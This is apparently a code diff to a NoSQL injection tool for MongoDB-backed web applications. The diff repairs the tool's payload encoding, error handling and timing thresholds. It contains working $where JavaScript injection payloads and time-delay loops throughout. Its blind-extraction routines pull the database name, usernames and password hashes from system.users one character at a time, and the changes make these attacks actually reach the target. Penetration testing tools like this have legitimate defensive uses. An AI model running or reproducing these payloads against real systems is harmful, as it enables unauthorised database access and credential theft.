@@ -13,9 +13,18 @@ import datetime
 import time
 import random
 
-# Fix for dealing with self-signed certificates.  This is wrong and highly discouraged, to be revisited in stable branch
+# Tolerate self-signed certificates on attacker-chosen targets WITHOUT disabling
+# TLS verification process-wide.  An unverified context is scoped to this module's
+# own requests (passed via context=) instead of replacing the global default,
+# which previously weakened certificate validation for every library in the
+# process (including any credentials this tool sends elsewhere).
 import ssl
-ssl._create_default_https_context = ssl._create_unverified_context
+_SSL_CTX = ssl._create_unverified_context()
+
+# Placeholder token substituted by getDBInfo() into the blind-injection template
+# slot built by buildUri().  Chosen so it cannot collide with percent-encoded
+# parameter values.
+MARKER = "NSMxINJx16"
 
 
 def save_to(savePath, vulnAddrs, possAddrs, strTbAttack,intTbAttack):
@@ -59,6 +68,9 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
     httpMethod = "GET"
     testNum = 1
     paramValue = []
+    # GET mode has no POST body; defined so the shared errorTest()/checkResult()
+    # signatures can be called uniformly without a NameError.
+    postData = None
     global vulnAddrs
     vulnAddrs = []
     global possAddrs
@@ -87,10 +99,10 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
         appURL = "https://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
     try:
         req = urllib.request.Request(appURL, None, requestHeaders)
-        appRespCode = urllib.request.urlopen(req).getcode()
+        appRespCode = urllib.request.urlopen(req, context=_SSL_CTX).getcode()
         if appRespCode == 200:
             normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = urllib.request.urlopen(req)
+            timeReq = urllib.request.urlopen(req, context=_SSL_CTX)
             start = time.time()
             page = timeReq.read()
             end = time.time()
@@ -105,7 +117,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         else:
             print("Got " + str(appRespCode) + "from the app, check your options.")
-    except NoSQLMapException as e:
+    except (urllib.error.URLError, urllib.error.HTTPError, OSError) as e:
         print(e)
         print("Looks like the server didn't respond.  Check your options.")
 
@@ -120,7 +132,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
                 if sizeSelect:
                     print("Invalid! The size should be an integer.")
 
-            format = randInjString(int(injectSize))
+            format = randInjString()
         else:
             injectSize = int(args.injectSize)
             format = args.injectFormat
@@ -138,6 +150,9 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             return()
 
         randomUri = buildUri(appURL,injectString, args)
+        if randomUri is None:
+            # buildUri couldn't parse the URL / parameter selection.
+            return()
         print("URI : " + randomUri)
         req = urllib.request.Request(randomUri, None, requestHeaders)
 
@@ -165,7 +180,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
         # Test for errors returned by injection
         req = urllib.request.Request(uriArray[1], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -184,7 +199,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
         print(uriArray[2])
         req = urllib.request.Request(uriArray[2], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -203,7 +218,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[3], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -223,7 +238,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[4], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -241,7 +256,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[5], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -260,7 +275,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[6], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -278,7 +293,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[7], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -297,7 +312,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
         req = urllib.request.Request(uriArray[8], None, requestHeaders)
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -307,7 +322,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
         if args == None:
             doTimeAttack = input("Start timing based tests (y/n)? ")
         else:
-            doTimeAttack = args.doTimeAttack
+            doTimeAttack = args.doTimeAttack or "N"
 
         if doTimeAttack.lower() == "y":
             print("Starting Javascript string escape time based injection...")
@@ -317,9 +332,9 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             end = time.time()
             #print(str(end))
             #print(str(start))
-            strTimeDelta = (int(round((end - start), 3)) - timeBase)
+            strTimeDelta = (end - start) - timeBase
             #print(str(strTimeDelta))
-            if strTimeDelta > 25:
+            if strTimeDelta > 7:
                 print("HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible.")
                 strTbAttack = True
 
@@ -334,9 +349,9 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             end = time.time()
             #print(str(end))
             #print(str(start))
-            intTimeDelta = (int(round((end - start), 3)) - timeBase)
+            intTimeDelta = (end - start) - timeBase
             #print(str(strTimeDelta))
-            if intTimeDelta > 25:
+            if intTimeDelta > 7:
                 print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
                 intTbAttack = True
 
@@ -348,7 +363,7 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
             bfInfo = input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
 
             if bfInfo.lower() == "y":
-                getDBInfo()
+                getDBInfo(requestHeaders)
 
 
         print("\n")
@@ -388,9 +403,13 @@ def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
 
 def getResponseBodyHandlingErrors(req):
     try:
-        responseBody = urllib.request.urlopen(req).read().decode('utf-8', errors='replace')
+        responseBody = urllib.request.urlopen(req, context=_SSL_CTX).read().decode('utf-8', errors='replace')
     except urllib.error.HTTPError as err:
         responseBody = err.read().decode('utf-8', errors='replace')
+    except urllib.error.URLError:
+        # Host went away mid-scan (connection refused / reset / DNS).  Return an
+        # empty body so the size-delta logic degrades instead of crashing.
+        responseBody = ""
 
     return responseBody
 
@@ -429,12 +448,12 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
     try:
         body = urllib.parse.urlencode(postData)
         req = urllib.request.Request(appURL,body.encode(), requestHeaders)
-        appRespCode = urllib.request.urlopen(req).getcode()
+        appRespCode = urllib.request.urlopen(req, context=_SSL_CTX).getcode()
 
         if appRespCode == 200:
 
             normLength = int(len(getResponseBodyHandlingErrors(req)))
-            timeReq = urllib.request.urlopen(req)
+            timeReq = urllib.request.urlopen(req, context=_SSL_CTX)
             start = time.time()
             page = timeReq.read()
             end = time.time()
@@ -450,7 +469,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Got " + str(appRespCode) + "from the app, check your options.")
 
-    except NoSQLMapException as e:
+    except (urllib.error.URLError, urllib.error.HTTPError, OSError) as e:
         print(e)
         print("Looks like the server didn't respond.  Check your options.")
 
@@ -469,7 +488,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
                 injIndex = int(args.injectedParameter)
             injOpt = str(list(postData.keys())[int(injIndex)-1])
             print("Injecting the " + injOpt + " parameter...")
-        except NoSQLMapException:
+        except (ValueError, IndexError, TypeError):
             if args == None:
                 input("Something went wrong.  Press enter to return to the main menu...")
             return
@@ -483,7 +502,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
                 if sizeSelect:
                     print("Invalid! The size should be an integer.")
 
-            format = randInjString(int(injectSize))
+            format = randInjString()
         else:
             injectSize = int(args.injectSize)
             format = args.injectFormat
@@ -525,7 +544,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 1: PHP/ExpressJS != associative array injection")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -549,7 +568,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 2:  PHP/ExpressJS > Undefined Injection")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -569,7 +588,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 3: $where injection (string escape)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -590,7 +609,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 4: $where injection (integer escape)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -612,7 +631,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 5: $where injection string escape (single record)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -634,7 +653,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 6: $where injection integer escape (single record)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -657,7 +676,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 7: This != injection (string escape)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -678,7 +697,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Test 8:  This != injection (integer escape)")
 
         respBody = getResponseBodyHandlingErrors(req)
-        errorCheck = errorTest(respBody,testNum)
+        errorCheck = errorTest(respBody,testNum,postData)
 
         if errorCheck == False:
             injLen = int(len(respBody))
@@ -689,22 +708,23 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             testNum += 1
         print("\n")
 
-        doTimeAttack = "N"
         if args == None:
             doTimeAttack = input("Start timing based tests (y/n)? ")
+        else:
+            doTimeAttack = args.doTimeAttack or "N"
 
-        if doTimeAttack == "y" or doTimeAttack == "Y":
+        if doTimeAttack.lower() == "y":
             print("Starting Javascript string escape time based injection...")
             postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()))/1000 < 10); return true; var dummy='a"})
             body = urllib.parse.urlencode(postData)
             req = urllib.request.Request(appURL,body.encode(), requestHeaders)
             start = time.time()
-            conn = urllib.request.urlopen(req)
+            conn = urllib.request.urlopen(req, context=_SSL_CTX)
             page = conn.read()
             end = time.time()
             conn.close()
-            strTimeDelta = (int(round((end - start), 3)) - timeBase)
-            if strTimeDelta > 25:
+            strTimeDelta = (end - start) - timeBase
+            if strTimeDelta > 7:
                 print("HTTP load time variance was " + str(strTimeDelta) +"  seconds! Injection possible.")
                 strTbAttack = True
 
@@ -718,12 +738,12 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             body = urllib.parse.urlencode(postData)
             req = urllib.request.Request(appURL,body.encode(), requestHeaders)
             start = time.time()
-            conn = urllib.request.urlopen(req)
+            conn = urllib.request.urlopen(req, context=_SSL_CTX)
             page = conn.read()
             end = time.time()
             conn.close()
-            intTimeDelta = ((end-start) - timeBase)
-            if intTimeDelta > 25:
+            intTimeDelta = (end - start) - timeBase
+            if intTimeDelta > 7:
                 print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
                 intTbAttack = True
 
@@ -765,12 +785,11 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
     return()
 
 
-def errorTest (errorCheck,testNum):
+def errorTest (errorCheck,testNum,postData=None):
     global possAddrs
     global httpMethod
     global neDict
     global gtDict
-    global postData
 
     if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
         print("Injection returned a MongoDB Error.  Injection may be possible.")
@@ -871,7 +890,7 @@ def checkResult(baseSize,respSize,testNum,verb,postData):
         return
 
 
-def randInjString(size):
+def randInjString():
     print("What format should the random string take?")
     print("1-Alphanumeric")
     print("2-Letters only")
@@ -915,7 +934,7 @@ def buildUri(origUri, randValue, args=None):
         split_uri = origUri.split("?")
         params = split_uri[1].split("&")
 
-    except NoSQLMapException:
+    except IndexError:
         input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
         return
 
@@ -944,7 +963,7 @@ def buildUri(origUri, randValue, args=None):
         for params in injOpt:
             print("Injecting the " + params + " parameter...")
 
-    except NoSQLMapException:
+    except (ValueError, IndexError, AttributeError, TypeError):
         input("Something went wrong.  Press enter to return to the main menu...")
         return
 
@@ -968,11 +987,12 @@ def buildUri(origUri, randValue, args=None):
             uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
             uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
             uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-            uriArray[14] += paramName[x] + "a'; return true; var dum='a"
-            uriArray[15] += paramName[x] + "1; return true; var dum=2"
-            #Add values that can be manipulated for database attacks
-            uriArray[16] += paramName[x] + "=a\'; ---"
-            uriArray[17] += paramName[x] + "=1; if ---"
+            uriArray[14] += paramName[x] + "=a'; return true; var dum='a" + "&"
+            uriArray[15] += paramName[x] + "=1; return true; var dum=2" + "&"
+            #Add values that can be manipulated for database attacks.  MARKER is
+            #substituted with a URL-encoded payload by getDBInfo()/_btUri().
+            uriArray[16] += paramName[x] + "=a'; " + MARKER + "&"
+            uriArray[17] += paramName[x] + "=1; if " + MARKER + "&"
             uriArray[18] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 
         else:
@@ -997,18 +1017,40 @@ def buildUri(origUri, randValue, args=None):
             uriArray[18] += paramName[x] + "=" + paramValue[x] + "&"
         x += 1
 
-    #Clip the extra & off the end of the URL
+    #Percent-encode each parameter VALUE while leaving the '=' and '&' delimiters
+    #intact, then prefix with the path.  (The original code quote_plus'd the whole
+    #query string, encoding the delimiters and destroying every payload.)
     x = 0
     while x <= 18:
-#        uriArray[x]= uriArray[x][:-1]
-        uriArray[x]=split_uri[0]+"?"+urllib.parse.quote_plus(uriArray[x][:-1])
-
+        uriArray[x] = split_uri[0] + "?" + _encodeQuery(uriArray[x])
         x += 1
 
     return uriArray[0]
 
 
-def getDBInfo():
+def _encodeQuery(rawQuery):
+    # Percent-encode parameter values while leaving '=' / '&' delimiters intact,
+    # so the server actually receives name=<payload> pairs.
+    q = urllib.parse.quote_plus
+    out = []
+    for seg in rawQuery.split("&"):
+        if seg == "":
+            continue
+        if "=" in seg:
+            name, val = seg.split("=", 1)
+            out.append(name + "=" + q(val))
+        else:
+            out.append(q(seg))
+    return "&".join(out)
+
+
+def _btUri(jsPayload):
+    # Build a blind-injection request URL by substituting the URL-encoded
+    # JavaScript payload into the template slot (uriArray[16]) built by buildUri().
+    return uriArray[16].replace(MARKER, urllib.parse.quote_plus(jsPayload))
+
+
+def getDBInfo(requestHeaders):
     curLen = 0
     nameLen = 0
     gotFullDb = False
@@ -1029,7 +1071,7 @@ def getDBInfo():
 
     chars = string.ascii_letters + string.digits
     print("Getting baseline True query return size...")
-    trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
+    trueUri = _btUri("return true; var dummy ='!" + "&")
     #print("Debug " + str(trueUri))
     req = urllib.request.Request(trueUri, None, requestHeaders)
     baseLen = int(len(getResponseBodyHandlingErrors(req)))
@@ -1038,7 +1080,7 @@ def getDBInfo():
     print("Calculating DB name length...")
 
     while gotNameLen == False:
-        calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
+        calcUri = _btUri("var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
         #print("Debug: " + calcUri)
         req = urllib.request.Request(calcUri, None, requestHeaders)
         lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1053,7 +1095,7 @@ def getDBInfo():
 
     print("Database Name: ", end="")
     while gotDbName == False:
-        charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
+        charUri = _btUri("var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
 
         req = urllib.request.Request(charUri, None, requestHeaders)
         lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1079,7 +1121,7 @@ def getDBInfo():
         nameCounter = 0
         # find the total number of users on the database
         while gotUserCnt == False:
-            usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
+            usrCntUri = _btUri("var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
 
             req = urllib.request.Request(usrCntUri, None, requestHeaders)
             lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1105,7 +1147,7 @@ def getDBInfo():
             if retrUsers == 0:
                 while charCountUsr == False:
                     # different query to get the first user vs. others
-                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+                    usrUri = _btUri("var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1118,7 +1160,7 @@ def getDBInfo():
                         usrChars += 1
 
                 while  rightCharsUsr < usrChars:
-                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
+                    usrUri = _btUri("var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
 
                     req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1143,7 +1185,7 @@ def getDBInfo():
                 username = ""
 
                 while rightCharsHash < 32:  #Hash length is static
-                    hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
+                    hashUri = _btUri("var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
 
                     req = urllib.request.Request(hashUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1166,7 +1208,7 @@ def getDBInfo():
             else:
                 while charCountUsr == False:
                     # different query to get the first user vs. others
-                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+                    usrUri = _btUri("var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
 
                     req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1179,7 +1221,7 @@ def getDBInfo():
                         usrChars += 1
 
                 while  rightCharsUsr < usrChars:
-                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
+                    usrUri = _btUri("var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
 
                     req = urllib.request.Request(usrUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
@@ -1201,7 +1243,7 @@ def getDBInfo():
                 usrChars = 0
 
                 while rightCharsHash < 32:  #Hash length is static
-                    hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
+                    hashUri = _btUri("var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
 
                     req = urllib.request.Request(hashUri, None, requestHeaders)
                     lenUri = int(len(getResponseBodyHandlingErrors(req)))
